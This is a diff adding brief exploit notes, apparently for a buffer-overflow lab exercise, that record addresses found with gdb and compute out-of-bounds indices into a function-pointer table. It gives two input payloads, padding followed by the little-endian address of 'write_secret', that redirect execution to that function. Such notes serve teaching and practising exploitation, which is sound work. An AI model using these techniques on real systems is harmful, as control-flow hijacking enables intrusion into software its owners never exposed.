@@ -1,0 +1,20 @@
+Get adress with gdb:
+0xbffff534 = p
+0x8048534 = write_secret
+0x804a0d4 = ptrs
+0xbffff130 = buf
+0x8048559 = pat_on_back
+
+Enter this number in the main menu, to execute pat_on_back
+(&p - ptrs) / 4 = 771675416
+
+Enter this number in the main menu, to execute code in buf[64]
+0xbffff170 = &buf[64]
+(&buf[64] - ptrs) / 4 = 771675175
+
+Enter this in the main menu, to execute write_secret
+771675175\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x85\x04\x08
+
+Enter wisdom with to execute write secret: 
+0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\x34\x85\x04\x08
+--> executes write secret (148 bytes + address of write_secret)
